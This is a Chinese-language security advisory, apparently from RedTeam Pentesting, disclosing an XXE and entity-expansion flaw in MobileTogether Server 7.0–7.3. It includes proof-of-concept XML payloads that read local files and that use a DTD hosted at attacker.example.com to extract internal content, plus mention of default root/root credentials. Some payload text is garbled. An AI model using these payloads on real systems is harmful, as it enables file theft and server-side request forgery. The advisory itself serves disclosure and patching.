RedTeam Pentesting 在 MobileTogether 服务器中发现了一个漏洞，该漏洞允许访问至少一个应用程序的用户从文件系统中读取任意非二进制文件并执行服务器端请求。该漏洞还可用于拒绝系统的可用性。例如，此通报显示了服务器证书和私钥的泄露。


细节

========

产品：MobileTogether 服务器

受影响的版本：7.0-7.3，可能还有更早的版本

固定版本：7.3 SP1

漏洞类型：XML 外部和指数实体扩展

安全风险：中等

供应商网址：https://www.altova.com/mobiletogether-server

供应商状态：已发布固定版本

介绍

============

“MobileTogether Server 是您的原生 iOS、Android、Windows 和基于浏览器的应用程序的处理强国。


MobileTogether Server 是您解决方案的后端中心，并充当最终用户与您的后端数据源和基础设施之间的网关。”


（来自供应商的主页）


更多细节

============

MobileTogether Server 是一个后端应用程序，托管开发的应用程序并提供对各种平台和设备的访问。可以通过设备和操作系统的本机应用程序或直接通过浏览器访问这些应用程序。要访问 MobileTogether 服务器，根据配置，可以匿名登录或需要凭据。


在分析智能手机上的 MobileTogether 客户端应用程序与 MobileTogether 服务器之间的通信期间，观察到包含 JSON 和 XML 数据的 HTTP 请求。通常，XML 数据用于表示 UI 中的更改或用户为 MobileTogether Server 中托管的应用程序提供的输入。


发现描述的 HTTP 请求中包含的用户提供的 XML 外部实体由 MobileTogether 服务器解析，结果反映在 HTTP 响应中。


此行为允许读取本地文件、执行服务器端请求并通过 XML 指数实体扩展拒绝服务的可用性。但是，文件公开仅限于非二进制文件，需要提前知道绝对路径。


概念证明

================

MobileTogether Server 附带了一系列示例应用程序。要利用此漏洞，至少需要访问一个应用程序。下面以应用 EuroFXrates 和默认用户 root 和默认密码 root 来演示漏洞。

随着在 XML 数据之后，可以验证 XML 实体是否在 HTTP 响应中的预定义 XML 标记中得到解析和反映：

<?xml version="1.0" encoding="utf-8"?><!DOCTYPE Root [ <!ENTITY redteam "RedTeam Pentesting"> ]><Root><RedTeam>&redteam;</RedTeam></Root>

HTTP 响应包含解析的 XML 实体：

HTTP/1.1 200 OKContent-Type: text/html;charset=utf-8Server: CherryPy/18.1.0[...]
[...]<?xml version=\"1.0\" encoding=\"utf-8\"?><Root><RedTeam>RedTeam Pentesting</RedTeam>[...]

以下示例显示了如何从在 Windows 系统上托管 MobileTogether Server 的服务器系统读取本地文件：

<?xml version="1.0" encoding="utf-8"?><!DOCTYPE Root [ <!ENTITY redteam SYSTEM "file://c :/windows/win.ini"> ]><Root><RedTeam>&redteam;</RedTeam></Root>

的文件内容如下所示，并进行了格式化以提高可读性：

HTTP/1.1 200 OKContent-Type: text/html;charset=utf-8Server: CherryPy/18.1.0[...]
[...]<?xml version=\"1.0\" encoding=\"utf-8\"?><Root><RedTeam>    ; for 16-bit app support    [fonts]    [extensions]    [mci extensions]    [files]    [Mail]    MAPI=1</RedTeam>[...]

攻击者的一个有趣目标可能是位于以下固定位置的 MobileTogether 服务器的配置文件：

C:\ProgramData\Altova\MobileTogetherServer\mobiletogetherserver.cfg

例如，如果服务器支持HTTPS，则服务器证书的绝对路径私钥存储在其配置中。


此外，外部 XML 实体可用于访问第三方网站以及仅在内部可用的 Web 服务。与外部托管的 XML DTD 一起，可以提取响应信息：

<?xml version="1.0" encoding="utf-8 "?><!DOCTYPE root [ <!ENTITY % start "<![CDATA["> <!ENTITY % content SYSTEM "http://internal.<!ENTITY % end "]]>"> <!ENTITY % dtd SYSTEM "http://attacker.example.com/dtd.xml"> % dtd; ]> <Root><RedTeam>&redteam;</RedTeam></Root>

DTD 包含以下信息：

<!ENTITY redteam "%start;%content;%end;">

在 HTTP 响应中，internal.example.com 提供的 HTML 标记现在可见。

解决方法

==========

未知。


修复

==========

根据供应商的说法，升级到版本 7.3 SP1 可以解决该漏洞。


安全风险

==============

拥有 MobileTogether 服务器帐户且至少可以访问一个应用程序的攻击者能够从服务器系统读取文件，向外部和内部系统发出 HTTP 请求并且还可以拒绝服务的可用性。也可以通过默认凭据或匿名用户进行访问。
